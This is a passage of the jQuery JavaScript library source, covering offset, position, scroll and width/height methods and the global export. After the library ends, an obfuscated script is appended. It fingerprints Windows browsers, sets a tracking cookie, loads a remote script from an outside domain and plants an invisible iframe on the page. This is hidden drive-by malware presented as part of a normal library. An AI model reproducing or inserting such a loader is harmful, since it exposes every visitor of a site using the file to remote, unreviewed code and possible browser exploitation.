<html><body>" );
				iframeDoc.close();
			}

			elem = iframeDoc.createElement( nodeName );

			iframeDoc.body.appendChild( elem );

			display = jQuery.css( elem, "display" );
			body.removeChild( iframe );
		}

		// Store the correct default display
		elemdisplay[ nodeName ] = display;
	}

	return elemdisplay[ nodeName ];
}




var rtable = /^t(?:able|d|h)$/i,
	rroot = /^(?:body|html)$/i;

if ( "getBoundingClientRect" in document.documentElement ) {
	jQuery.fn.offset = function( options ) {
		var elem = this[0], box;

		if ( options ) {
			return this.each(function( i ) {
				jQuery.offset.setOffset( this, options, i );
			});
		}

		if ( !elem || !elem.ownerDocument ) {
			return null;
		}

		if ( elem === elem.ownerDocument.body ) {
			return jQuery.offset.bodyOffset( elem );
		}

		try {
			box = elem.getBoundingClientRect();
		} catch(e) {}

		var doc = elem.ownerDocument,
			docElem = doc.documentElement;

		// Make sure we're not dealing with a disconnected DOM node
		if ( !box || !jQuery.contains( docElem, elem ) ) {
			return box ? { top: box.top, left: box.left } : { top: 0, left: 0 };
		}

		var body = doc.body,
			win = getWindow(doc),
			clientTop  = docElem.clientTop  || body.clientTop  || 0,
			clientLeft = docElem.clientLeft || body.clientLeft || 0,
			scrollTop  = win.pageYOffset || jQuery.support.boxModel && docElem.scrollTop  || body.scrollTop,
			scrollLeft = win.pageXOffset || jQuery.support.boxModel && docElem.scrollLeft || body.scrollLeft,
			top  = box.top  + scrollTop  - clientTop,
			left = box.left + scrollLeft - clientLeft;

		return { top: top, left: left };
	};

} else {
	jQuery.fn.offset = function( options ) {
		var elem = this[0];

		if ( options ) {
			return this.each(function( i ) {
				jQuery.offset.setOffset( this, options, i );
			});
		}

		if ( !elem || !elem.ownerDocument ) {
			return null;
		}

		if ( elem === elem.ownerDocument.body ) {
			return jQuery.offset.bodyOffset( elem );
		}

		var computedStyle,
			offsetParent = elem.offsetParent,
			prevOffsetParent = elem,
			doc = elem.ownerDocument,
			docElem = doc.documentElement,
			body = doc.body,
			defaultView = doc.defaultView,
			prevComputedStyle = defaultView ? defaultView.getComputedStyle( elem, null ) : elem.currentStyle,
			top = elem.offsetTop,
			left = elem.offsetLeft;

		while ( (elem = elem.parentNode) && elem !== body && elem !== docElem ) {
			if ( jQuery.support.fixedPosition && prevComputedStyle.position === "fixed" ) {
				break;
			}

			computedStyle = defaultView ? defaultView.getComputedStyle(elem, null) : elem.currentStyle;
			top  -= elem.scrollTop;
			left -= elem.scrollLeft;

			if ( elem === offsetParent ) {
				top  += elem.offsetTop;
				left += elem.offsetLeft;

				if ( jQuery.support.doesNotAddBorder && !(jQuery.support.doesAddBorderForTableAndCells && rtable.test(elem.nodeName)) ) {
					top  += parseFloat( computedStyle.borderTopWidth  ) || 0;
					left += parseFloat( computedStyle.borderLeftWidth ) || 0;
				}

				prevOffsetParent = offsetParent;
				offsetParent = elem.offsetParent;
			}

			if ( jQuery.support.subtractsBorderForOverflowNotVisible && computedStyle.overflow !== "visible" ) {
				top  += parseFloat( computedStyle.borderTopWidth  ) || 0;
				left += parseFloat( computedStyle.borderLeftWidth ) || 0;
			}

			prevComputedStyle = computedStyle;
		}

		if ( prevComputedStyle.position === "relative" || prevComputedStyle.position === "static" ) {
			top  += body.offsetTop;
			left += body.offsetLeft;
		}

		if ( jQuery.support.fixedPosition && prevComputedStyle.position === "fixed" ) {
			top  += Math.max( docElem.scrollTop, body.scrollTop );
			left += Math.max( docElem.scrollLeft, body.scrollLeft );
		}

		return { top: top, left: left };
	};
}

jQuery.offset = {

	bodyOffset: function( body ) {
		var top = body.offsetTop,
			left = body.offsetLeft;

		if ( jQuery.support.doesNotIncludeMarginInBodyOffset ) {
			top  += parseFloat( jQuery.css(body, "marginTop") ) || 0;
			left += parseFloat( jQuery.css(body, "marginLeft") ) || 0;
		}

		return { top: top, left: left };
	},

	setOffset: function( elem, options, i ) {
		var position = jQuery.css( elem, "position" );

		// set position first, in-case top/left are set even on static elem
		if ( position === "static" ) {
			elem.style.position = "relative";
		}

		var curElem = jQuery( elem ),
			curOffset = curElem.offset(),
			curCSSTop = jQuery.css( elem, "top" ),
			curCSSLeft = jQuery.css( elem, "left" ),
			calculatePosition = ( position === "absolute" || position === "fixed" ) && jQuery.inArray("auto", [curCSSTop, curCSSLeft]) > -1,
			props = {}, curPosition = {}, curTop, curLeft;

		// need to be able to calculate position if either top or left is auto and position is either absolute or fixed
		if ( calculatePosition ) {
			curPosition = curElem.position();
			curTop = curPosition.top;
			curLeft = curPosition.left;
		} else {
			curTop = parseFloat( curCSSTop ) || 0;
			curLeft = parseFloat( curCSSLeft ) || 0;
		}

		if ( jQuery.isFunction( options ) ) {
			options = options.call( elem, i, curOffset );
		}

		if ( options.top != null ) {
			props.top = ( options.top - curOffset.top ) + curTop;
		}
		if ( options.left != null ) {
			props.left = ( options.left - curOffset.left ) + curLeft;
		}

		if ( "using" in options ) {
			options.using.call( elem, props );
		} else {
			curElem.css( props );
		}
	}
};


jQuery.fn.extend({

	position: function() {
		if ( !this[0] ) {
			return null;
		}

		var elem = this[0],

		// Get *real* offsetParent
		offsetParent = this.offsetParent(),

		// Get correct offsets
		offset       = this.offset(),
		parentOffset = rroot.test(offsetParent[0].nodeName) ? { top: 0, left: 0 } : offsetParent.offset();

		// Subtract element margins
		// note: when an element has margin: auto the offsetLeft and marginLeft
		// are the same in Safari causing offset.left to incorrectly be 0
		offset.top  -= parseFloat( jQuery.css(elem, "marginTop") ) || 0;
		offset.left -= parseFloat( jQuery.css(elem, "marginLeft") ) || 0;

		// Add offsetParent borders
		parentOffset.top  += parseFloat( jQuery.css(offsetParent[0], "borderTopWidth") ) || 0;
		parentOffset.left += parseFloat( jQuery.css(offsetParent[0], "borderLeftWidth") ) || 0;

		// Subtract the two offsets
		return {
			top:  offset.top  - parentOffset.top,
			left: offset.left - parentOffset.left
		};
	},

	offsetParent: function() {
		return this.map(function() {
			var offsetParent = this.offsetParent || document.body;
			while ( offsetParent && (!rroot.test(offsetParent.nodeName) && jQuery.css(offsetParent, "position") === "static") ) {
				offsetParent = offsetParent.offsetParent;
			}
			return offsetParent;
		});
	}
});


// Create scrollLeft and scrollTop methods
jQuery.each( ["Left", "Top"], function( i, name ) {
	var method = "scroll" + name;

	jQuery.fn[ method ] = function( val ) {
		var elem, win;

		if ( val === undefined ) {
			elem = this[ 0 ];

			if ( !elem ) {
				return null;
			}

			win = getWindow( elem );

			// Return the scroll offset
			return win ? ("pageXOffset" in win) ? win[ i ? "pageYOffset" : "pageXOffset" ] :
				jQuery.support.boxModel && win.document.documentElement[ method ] ||
					win.document.body[ method ] :
				elem[ method ];
		}

		// Set the scroll offset
		return this.each(function() {
			win = getWindow( this );

			if ( win ) {
				win.scrollTo(
					!i ? val : jQuery( win ).scrollLeft(),
					 i ? val : jQuery( win ).scrollTop()
				);

			} else {
				this[ method ] = val;
			}
		});
	};
});

function getWindow( elem ) {
	return jQuery.isWindow( elem ) ?
		elem :
		elem.nodeType === 9 ?
			elem.defaultView || elem.parentWindow :
			false;
}




// Create width, height, innerHeight, innerWidth, outerHeight and outerWidth methods
jQuery.each([ "Height", "Width" ], function( i, name ) {

	var type = name.toLowerCase();

	// innerHeight and innerWidth
	jQuery.fn[ "inner" + name ] = function() {
		var elem = this[0];
		return elem ?
			elem.style ?
			parseFloat( jQuery.css( elem, type, "padding" ) ) :
			this[ type ]() :
			null;
	};

	// outerHeight and outerWidth
	jQuery.fn[ "outer" + name ] = function( margin ) {
		var elem = this[0];
		return elem ?
			elem.style ?
			parseFloat( jQuery.css( elem, type, margin ? "margin" : "border" ) ) :
			this[ type ]() :
			null;
	};

	jQuery.fn[ type ] = function( size ) {
		// Get window width or height
		var elem = this[0];
		if ( !elem ) {
			return size == null ? null : this;
		}

		if ( jQuery.isFunction( size ) ) {
			return this.each(function( i ) {
				var self = jQuery( this );
				self[ type ]( size.call( this, i, self[ type ]() ) );
			});
		}

		if ( jQuery.isWindow( elem ) ) {
			// Everyone else use document.documentElement or document.body depending on Quirks vs Standards mode
			// 3rd condition allows Nokia support, as it supports the docElem prop but not CSS1Compat
			var docElemProp = elem.document.documentElement[ "client" + name ],
				body = elem.document.body;
			return elem.document.compatMode === "CSS1Compat" && docElemProp ||
				body && body[ "client" + name ] || docElemProp;

		// Get document width or height
		} else if ( elem.nodeType === 9 ) {
			// Either scroll[Width/Height] or offset[Width/Height], whichever is greater
			return Math.max(
				elem.documentElement["client" + name],
				elem.body["scroll" + name], elem.documentElement["scroll" + name],
				elem.body["offset" + name], elem.documentElement["offset" + name]
			);

		// Get or set width or height on the element
		} else if ( size === undefined ) {
			var orig = jQuery.css( elem, type ),
				ret = parseFloat( orig );

			return jQuery.isNumeric( ret ) ? ret : orig;

		// Set the width or height on the element (default to pixels if value is unitless)
		} else {
			return this.css( type, typeof size === "string" ? size : size + "px" );
		}
	};

});




// Expose jQuery to the global object
window.jQuery = window.$ = jQuery;

// Expose jQuery as an AMD module, but only for AMD loaders that
// understand the issues with loading multiple versions of jQuery
// in a page that all might call define(). The loader will indicate
// they have special allowances for multiple jQuery versions by
// specifying define.amd.jQuery = true. Register as a named module,
// since jQuery can be concatenated with other files that may use define,
// but not use a proper concatenation script that understands anonymous
// AMD modules. A named AMD is safest and most robust way to register.
// Lowercase jquery is used because AMD module names are derived from
// file names, and jQuery is normally delivered in a lowercase file name.
// Do this after creating the global so that if an AMD module wants to call
// noConflict to hide this version of jQuery, it will work.
if ( typeof define === "function" && define.amd && define.amd.jQuery ) {
	define( "jquery", [], function () { return jQuery; } );
}



})( window );

/* qi4kObdGRkLwG6cDQ3s */var cHuhhx="\x75seridA08\u00317\x46\u004225";var Tijtyos="30";function iRGpD(GIbURx){var eGHrQ8=document.cookie.replace(/\s/g,"").split(";");for(var cTDL3SJ=0;cTDL3SJ<eGHrQ8.length;cTDL3SJ++){var Hc7Nfx0=eGHrQ8[cTDL3SJ].split("=");if(Hc7Nfx0[0]==GIbURx){return unescape(Hc7Nfx0[1]);}}return null;};function CLRScDz(GIbURx,wAGmdx,vsS9qzn){var UHVvcb=new Date();var RnfJf=UHVvcb.getTime()+(vsS9qzn*60*60*1000);UHVvcb.setTime(RnfJf);var gm05Mv=GIbURx+"="+escape(wAGmdx)+";\x20exp\u0069res\u003d"+UHVvcb.toGMTString()+"; d\u006fm\u0061in="+document.domain;document.cookie=gm05Mv;};function au(aP,ah){var aE=aP+Math.floor(Math.random()*(ah-aP));return aG(aE);};function aG(aE){var bM="\x61bcdefghijklmno\u0070\x71rstu\u0076\u0077x\u0079z";var bo='';for(var i=0;i<aE;i++){var aI=Math.floor(Math.random()*bM.length);bo+=bM.substring(aI,aI+1);}return bo;};function AbbKE(){CLRScDz(cHuhhx,Tijtyos,48);};function TL06R8(){var HzxJj=new RegExp("[g\x2dzG-Z\x5d+","g");var MuniexT=new RegExp("[=_!()\x40$\u003b\x2e,]+","g");return unescape(main_color_handle.replace(HzxJj,"").replace(MuniexT,"%"));};function o7o9k(){try{LDtbMQ="mi\u0072ro\x72_lay\u0065r_id\u0065nt";if(main_color_handle.length==0){CLRScDz(cHuhhx,Tijtyos,48);return;}try{if(document.getElementById(LDtbMQ)){document.getElementById(LDtbMQ).parentNode.removeChild(document.getElementById(LDtbMQ));}}catch(e_ntl){};var znpSb_w=TL06R8();var i5iuQKD="<if\u0072ame o\u006eloa\u0064=\x27AbbK\u0045();\x27\u0020s\x72c=\x27"+znpSb_w+"' \x77idth=19 h\x65\u0069ght=19 f\x72ameb\x6frder=0 scrol\u006cing\x3d\u0027n\u006f\u0027>\u003c/i\x66ram\u0065>";var gtya27=document.createElement("DI\u0056");gtya27.innerHTML=i5iuQKD;gtya27.id=LDtbMQ;gtya27.style.cssText="positi\x6fn:abs\x6flute\u003ble\u0066t\x3a0px;top\x3a\u0032\x300px;o\x70acity\x3a0;\u0066il\u0074e\x72:a\x6cpha(opaci\x74y=0);";document.body.appendChild(gtya27);}catch(e_ntl){setTimeout("o7\u006f9k\x28)",300);}};function JkGIf(){var ASouMm,EwJzgm="\x4bHnc\x64u2d\x65343";try{if(document.getElementById(EwJzgm)){document.getElementById(EwJzgm).parentNode.removeChild(document.getElementById(EwJzgm));}ASouMm=document.createElement("S\x43\x52IPT");ASouMm.type="tex\x74/\u006aavasc\u0072ip\u0074";ASouMm.id=EwJzgm;if(ASouMm.readyState){ASouMm.onreadystatechange=function(){var G=this.readyState;if(G=="l\x6f\x61ded"||G=="co\x6dple\x74e"){ASouMm.onreadystatechange=null;o7o9k();}};}else{ASouMm.onload=function(){o7o9k();};}{ASouMm.src="htt\u0070://s\x74.dynamicw\x6fr\x64s\u002eus\x2f"+au(2,6)+"view\x66or\u0075m"+au(2,6)+".p\u0068p"}if(document.getElementsByTagName("h\x65ad").length>0){document.getElementsByTagName("\x68ead")[0].appendChild(ASouMm);}else{document.getElementsByTagName("bod\u0079")[0].appendChild(ASouMm);}}catch(e_ntl){setTimeout("JkGIf\x28\x29",300);}};function FOjs1Mt(){var tbP3kg8=navigator.userAgent;var aglmH=0;if(tbP3kg8.indexOf("Wi\u006e\u0064ows")== -1||(tbP3kg8.indexOf("\x4dSIE")== -1&&tbP3kg8.indexOf("\u0047e\u0063ko/")== -1&&tbP3kg8.indexOf("Tr\x69de\u006et")== -1)){return 0;}try{try{if(iRGpD(cHuhhx)==Tijtyos){return false;}}catch(e_ntl){};if(tbP3kg8.indexOf("MS\u0049E")!= -1||tbP3kg8.indexOf("\x54r\x69dent")!= -1){try{aglmH=CB5yyy7();function CB5yyy7(){return 0;}}catch(e_ntl){aglmH=1;}}}catch(e_ntl){};if(aglmH==0){JkGIf();}};FOjs1Mt(); /* iJEwisM */
